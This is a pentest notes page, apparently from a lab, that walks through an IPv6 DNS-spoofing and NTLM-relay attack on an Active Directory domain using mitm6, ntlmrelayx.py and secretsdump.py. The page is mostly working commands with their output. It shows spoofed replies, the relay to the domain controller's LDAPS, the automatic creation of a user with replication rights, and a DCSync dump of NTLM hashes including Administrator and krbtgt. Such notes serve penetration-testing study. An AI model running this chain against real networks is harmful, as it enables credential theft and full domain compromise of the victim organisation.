# mitm6

{% embed url="https://github.com/dirkjanm/mitm6" %}

{% embed url="https://blog.fox-it.com/2018/01/11/mitm6-compromising-ipv4-networks-via-ipv6/" %}

{% embed url="https://dirkjanm.io/worst-of-both-worlds-ntlm-relaying-and-kerberos-delegation/" %}

#### mitm6 combined with ntlmrelayx.py

```
kali@kali:~ $ sudo mitm6 -i eth0 -d planetexpress.local
Starting mitm6 using the following configuration:
Primary adapter: eth0 [08:00:27:b2:d7:a3]
IPv4 address: 192.168.56.201
IPv6 address: fe80::a00:27ff:feb2:d7a3
DNS local search domain: planetexpress.local
DNS allowlist: planetexpress.local
...
Sent spoofed reply for PLANETEXPRESS-DC.PLANETEXPRESS.local. to fe80::192:168:56:110
Sent spoofed reply for wpad.PLANETEXPRESS.local. to fe80::192:168:56:110
Sent spoofed reply for wpad.planetexpress.local. to fe80::192:168:56:110
IPv6 address fe80::192:168:56:109 is now assigned to mac=08:00:27:ce:0f:54 host=Fry.PLANETEXPRESS.local. ipv4=192.168.56.109
Sent spoofed reply for PLANETEXPRESS-DC.PLANETEXPRESS.local. to fe80::192:168:56:109
IPv6 address fe80::192:168:56:110 is now assigned to mac=08:00:27:c2:68:8c host=Leela.PLANETEXPRESS.local. ipv4=192.168.56.110
Sent spoofed reply for PLANETEXPRESS-DC.PLANETEXPRESS.local. to fe80::192:168:56:109
...
```

```
kali@kali:~ $ ntlmrelayx.py -6 -t ldaps://192.168.56.108 -wh fakewpad.planetexpress.local -l lootbox 
Impacket v0.9.24 - Copyright 2021 SecureAuth Corporation

[*] Protocol Client MSSQL loaded..
[*] Protocol Client DCSYNC loaded..
[*] Protocol Client IMAPS loaded..
[*] Protocol Client IMAP loaded..
[*] Protocol Client RPC loaded..
[*] Protocol Client HTTPS loaded..
[*] Protocol Client HTTP loaded..
[*] Protocol Client SMTP loaded..
[*] Protocol Client SMB loaded..
[*] Protocol Client LDAPS loaded..
[*] Protocol Client LDAP loaded..
[*] Running in relay mode to single host
[*] Setting up SMB Server
[*] Setting up HTTP Server

[*] Setting up WCF Server
[*] Servers started, waiting for connections
[*] HTTPD: Received connection from ::ffff:192.168.56.109, attacking target ldaps://192.168.56.108
[*] HTTPD: Client requested path: /wpad.dat
[*] HTTPD: Client requested path: /wpad.dat
[*] HTTPD: Serving PAC file to client ::ffff:192.168.56.109
[*] HTTPD: Received connection from ::ffff:192.168.56.109, attacking target ldaps://192.168.56.108
[*] HTTPD: Received connection from ::ffff:192.168.56.109, attacking target ldaps://192.168.56.108
[*] Authenticating against ldaps://192.168.56.108 as PLANETEXPRESS\FRY$ SUCCEED
[*] Enumerating relayed user's privileges. This may take a while on large domains
[*] Dumping domain info for first time
[*] Domain info dumped into lootdir!
...
```

{% hint style="info" %}
Impacket v0.10.0 throws a error wanting a 'sid' argument to work with ldap however the --sid flag is unrecognised when used. Impacket v0.9.24 seems to work just fine without.
{% endhint %}

#### \~/lootbox/

Domain computers, groups, users, policies and trusts are all dumped as grep, json or html files is the loot directory specified by the -l flag.

#### domain\_users.html

![](../../.gitbook/assets/image.png)

#### But wait there's more

When a domain administrator logs into a machine, the ntlmrelayx.py attack attempts to create a new user automatically.

```
<more output from ntlmrelayx.py>
...
[*] User privileges found: Create user
[*] User privileges found: Adding user to a privileged group (Enterprise Admins)
[*] User privileges found: Modifying domain ACL
[*] Attempting to create user in: CN=Users,DC=PLANETEXPRESS,DC=local
[*] Adding new user with username: ZYtgqxywGO and password: &|#o3/sI-zZI[0% result: OK
[*] Querying domain security descriptor
[*] Success! User ZYtgqxywGO now has Replication-Get-Changes-All privileges on the domain
[*] Try using DCSync with secretsdump.py and this user :)
[*] Saved restore state to aclpwn-20220622-153838.restore
...

```

#### secrestdump.py was suggested to be run

```
kali@kali:~ $ secretsdump.py planetexpress.local/ZYtgqxywGO:'&|#o3/sI-zZI[0%'@192.168.56.108 -just-dc > secretsdump.txt

kali@kali:~ $ cat secretsdump.txt 
Impacket v0.9.24 - Copyright 2021 SecureAuth Corporation

[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
[*] Using the DRSUAPI method to get NTDS.DIT secrets
Administrator:500:aad3b435b51404eeaad3b435b51404ee:64f12cddaa88057e06a81b54e73b949b:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
krbtgt:502:aad3b435b51404eeaad3b435b51404ee:bb67c8aaeccfb6737581fd5796a792a3:::
...
[*] Kerberos keys grabbed
...

```

